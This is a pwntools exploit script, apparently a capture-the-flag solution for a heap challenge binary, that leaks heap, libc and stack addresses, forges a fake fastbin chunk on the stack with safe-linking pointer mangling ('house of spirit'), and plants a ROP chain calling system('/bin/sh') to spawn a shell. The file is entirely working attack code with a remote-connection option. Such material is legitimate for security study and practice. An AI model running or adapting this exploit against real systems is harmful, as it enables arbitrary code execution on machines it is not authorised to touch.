#!/usr/bin/python3

from pwn import *

exe = ELF('example_hos_fastbin', checksec=False)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''

                b*main+628
                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('')
else:
        p = process(exe.path)

GDB()
def create(size, content):
        sla(b'> ', '1')
        sla(b': ', str(size).encode())
        sa(b': ', content)
def remove(idx):
        sla(b'> ', '2')
        sla(b': ', str(idx).encode())
def write(payload):
        sla(b'> ', '3')
        sa(b'fun\n', payload)
def gift():
        sla(b'> ', '4')
        p.recvuntil(b't: \n')
        return int(p.recvline(keepends = False).decode())
create(8, b'a') # 0
remove(0)
create(8, b'0') # 0
p.recvuntil(b'tent: \n')
heap = u64(p.recvline(keepends = False).ljust(8, b'\0')) <<12
print(hex(heap))

create(0x500, b'a\n') # 1
create(0x50, b'a') # 2
remove(1)
create(0x500, b'a'*8) #1, count = 2
p.recvuntil(b'a' *8)
libc.address = u64(p.recvline(keepends = False).ljust(8, b'\0')) - 0x219ce0
info("libc address: " + hex(libc.address))

create(0x50, b'a\n') # 3
create(0x50, b'a\n') # 4
create(0x50, b'a\n') # 5
create(0x50, b'a\n') # 5
stack = gift()  
info("Stack: " + hex(stack))

payload = flat(
        stack+0xa0,
        0, 0x60,
        0, 0,
        0, 0,
        0, 0,
        0, 0,
)
write(payload)
remove(5)
remove(6)
remove(17)
payload = flat(
        (stack+0xa0),
        0, 0x60,
        (stack + 0x100) ^ (stack + 0xa0) >> 12, 0,
        0, 0,
        0, 0,
        0, 0,
)
write(payload)
create(0x50, b'a')
rop = ROP(libc)
payload = flat(
        stack, 
        rop.find_gadget(['ret']).address,
        rop.find_gadget(['pop rdi', 'ret']).address, next(libc.search(b'/bin/sh')),
        libc.sym.system
)
create(0x50, payload)
p.interactive()
